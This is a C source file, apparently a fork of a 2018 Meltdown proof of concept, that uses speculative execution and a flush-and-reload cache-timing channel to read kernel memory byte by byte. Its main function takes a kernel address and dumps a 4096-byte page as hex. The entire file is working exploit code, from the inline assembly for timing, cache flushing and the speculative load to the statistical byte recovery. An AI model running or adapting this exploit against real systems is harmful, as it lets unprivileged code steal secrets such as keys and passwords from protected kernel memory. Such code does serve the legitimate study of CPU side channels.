/*
 * Copyright (c) 2018 mniip
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its
 * contributors may be used to endorse or promote products derived from this
 * software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */
/*

Alejandro Caceres fork license:

What the dude above said.
*/


#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <setjmp.h>
#include <signal.h>

#include <math.h>


extern unsigned long long time_read(void const *);
asm(
".section .text\n"
".global time_read\n"
"time_read:\n"
"	mfence\n"
"	lfence\n"
"	rdtsc\n"
"	lfence\n"
"	movq %rax, %rcx\n"
"	movb (%rdi), %al\n"
"	lfence\n"
"	rdtsc\n"
"	subq %rcx, %rax\n"
"	ret\n"
);

extern void clflush(void *);
asm(
".section .text\n"
".global clflush\n"
"clflush:\n"
"	mfence\n"
"	clflush (%rdi)\n"
"	retq\n"
);

#define STR2(X) #X
#define STR(X) STR2(X)

#define PAGE_SIZE 4096
#define PTRS_PER_PAGE (PAGE_SIZE / sizeof(uint64_t))
#define POISON_LEN (PTRS_PER_PAGE * 1 - 1)
#define POISON_SKIP_RATE 4 // better be a divisor of PTRS_PER_PAGE

extern void poison_speculate(void **, long int *, char (*)[4096]);
asm(
".section .text\n"
".global poison_speculate\n"
"poison_speculate:\n"
"	addq $8*" STR((POISON_SKIP_RATE - 1)) ", %rdi\n"
"	addq $8*" STR((POISON_SKIP_RATE - 1)) ", %rsi\n"
"1:\n"
"	xorl %eax, %eax\n"
"	movq (%rdi), %r15\n"
"	prefetcht0 (%r15)\n"
"	movl (%rsi), %r14d\n"
"	testl %r14d, %r14d\n"
"	jnz 2f\n"
"	movb (%r15), %al\n"
"	shlq $12, %rax\n"
"	incb (%rdx, %rax)\n"
"	addq $8*" STR(POISON_SKIP_RATE) ", %rdi\n"
"	addq $8*" STR(POISON_SKIP_RATE) ", %rsi\n"
"	jmp 1b\n"
"2:	retq\n"
);

#define TENFOLD(x) x x x x x x x x x x
extern void stall_speculate(void *, char (*)[4096]);
asm(
".section .text\n"
".global stall_speculate\n"
"stall_speculate:\n"
"	mfence\n"
"	call 1f\n"
"	movzbl (%rdi), %eax\n"
"	shll $12, %eax\n"
"	movq (%rsi, %rax), %rcx\n"
"1:	xorps %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	movd %xmm0, %eax\n"
"	lea 8(%rsp, %rax), %rsp\n"
"	ret\n"
);

typedef struct
{
	char (*mapping)[PAGE_SIZE];
}
channel;

void open_channel(channel *ch)
{
	ch->mapping = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(ch->mapping == MAP_FAILED)
	{
		perror("mmap mapping");
		exit(EXIT_FAILURE);
	}
	memset(ch->mapping, 0, PAGE_SIZE * 256);
}

void free_channel(channel *ch)
{
	munmap(ch->mapping, PAGE_SIZE * 256);
}

void poke_kernel()
{
	syscall(0, -1, 0, 0);
}

char test_one = 1;
int dump = 0;

#define ITERATIONS 2000
#define TIME_DIVS 50
#define TIME_BUCKET 8
int timing[256][TIME_DIVS];

void collect_stats(channel *ch, void *addr)
{
	for(int ms = 0; ms < TIME_DIVS; ms++)
		for(int line = 0; line < 256; line++)
			timing[line][ms] = 0;

	for(int line = 0; line < 256; line++)
	{
		for(int i = 0; i < ITERATIONS; i++)
		{
			clflush(ch->mapping[line]);
			poke_kernel();
			//if(!setjmp(restore))
			stall_speculate(addr, ch->mapping);

			unsigned long long t = time_read(ch->mapping[line]);
			if(t / TIME_BUCKET < TIME_DIVS)
				timing[line][t / TIME_BUCKET]++;
		}
	}
}

int median(int *arr, int len)
{
	int sum = 0;
	for(int i = 0; i < len; i++)
		sum += arr[i];
	int total = 0;
	for(int i = 0; i < len; i++)
	{
		total += arr[i];
		if(total >= sum / 2)
			return i;
	}
	return len;
}

int cutoff_time;
int calculate_cutoff(channel *ch)
{
	collect_stats(ch, NULL);
	int med_miss = median(timing[128], TIME_DIVS) * TIME_BUCKET;
	cutoff_time = med_miss / 2;
}

#define PROB_HIT_ACCIDENTAL 0.0005
#define PROB_HIT_FAILS 0.9995
int hit_timing[256];
int miss_timing[256];
int run_timing_once(channel *ch, void *addr, double *uncertainty)
{
	for(int line = 0; line < 256; line++)
		hit_timing[line] = miss_timing[line] = 0;

	for(int line = 0; line < 256; line++)
	{
		for(int i = 0; i < ITERATIONS; i++)
		{
			clflush(ch->mapping[line]);

			poke_kernel();
			//if(!setjmp(restore))
			stall_speculate(addr, ch->mapping);
			unsigned long long t = time_read(ch->mapping[line]);
			(t < cutoff_time ? hit_timing : miss_timing)[line]++;
		}
	}

	int max_line = 0;
	for(int line = 1; line < 256; line++)
		if(max_line == 0 ? hit_timing[line] > 0 : hit_timing[line] > hit_timing[max_line])
			max_line = line;

	if(max_line)
	{
		*uncertainty = pow(PROB_HIT_ACCIDENTAL, hit_timing[max_line]);
		for(int line = 1; line < 256; line++)
			if(line != max_line && hit_timing[line])
				*uncertainty = 1.0 - (1.0 - *uncertainty) * pow(PROB_HIT_ACCIDENTAL, hit_timing[line]);
	}
	else
	{
		*uncertainty = pow(PROB_HIT_FAILS, ITERATIONS);
	}
	return max_line;
}

//#define MAX_UNCERTAINTY 5.4e-20
#define MAX_UNCERTAINTY 8.636e-78
#define MAX_RETRIES 100
double distribution[256];
int read_byte(channel *ch, void *addr, int verbose)
{
	for(int line = 0; line < 256; line++)
		distribution[line] = 1.0 / 256;
	int val = -1;
	if(verbose)
		printf("%20.13g %02x", 0, 0);
	while(val == -1)
	{
		double unc;
		int newval = run_timing_once(ch, addr, &unc);
		for(int line = 0; line < 256; line++)
			if(line != newval)
				distribution[line] = fmin(1.0, distribution[line] / unc);
		distribution[newval] *= unc;

		for(int line = 0; line < 256; line++)
			if(distribution[line] < MAX_UNCERTAINTY)
				val = line;

		int md = 0;
		for(int line = 0; line < 256; line++)
			if(distribution[line] < distribution[md])
				md = line;

		if(verbose)
			printf("\e[23D%20.13g %02x", distribution[md], md); fflush(stdout);
	}
	if(verbose)
		printf("\e[23D");
	return val;
}

int main(int argc, char *argv[])
{

	void *addr;
	if(argc < 2 || sscanf(argv[1], "%p", &addr) != 1)
	{
		fprintf(stderr, "Usage: %s 0xffff????????????\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	channel ch;
	open_channel(&ch);
	calculate_cutoff(&ch);
	printf("cutoff: %d\n", cutoff_time);

	for(int ln = 0; ln < 4096 / 16; ln++)
	{
		printf("%p | ", addr + ln * 16);

		unsigned char endianize[16];
		for(int p = 0; p < 16; p++)
		{
		  int val = read_byte(&ch, addr + ln * 16 + p, 1);
		  if(val < 0) {
		    printf("cannot read position %d\n", p);
		  }
		  else {
		    endianize[p] = (char)val;
		  }
		}
		
		unsigned char first_addr[8];
		unsigned char second_addr[8];
		int y = 0;
		for (int x = 15; x >= 0; --x)
		{
		  printf("%02x", endianize[x]);
		  if(x == 8) {
		    printf(" ");
		    first_addr[y] = endianize[x];
		  }
		  else if (x > 8) {
		    first_addr[y] = endianize[x];
		    //printf("%02x", first_addr[x]);
		  }

		  else if (x < 8) {
		    second_addr[y - 8] = endianize[x];
		    //printf("%02x", second_addr[x]);
		  }

		  else {
		    //should never be reached
		    printf("WTF are you doing here???\n");
		  }

		  y++;
		  //dbg printf("addrt: ~~ %02x ~~", first_addr[x]);
		 
		}
		
		for (int c = 0; c < 8; c++) {
		  printf("----%02x", second_addr[c]);
		}

		

		printf("\n");
		memset(&endianize[0], 0, sizeof(endianize));
		memset(&first_addr[0], 0, sizeof(first_addr));
		memset(&second_addr[0], 0, sizeof(second_addr));
	}
}
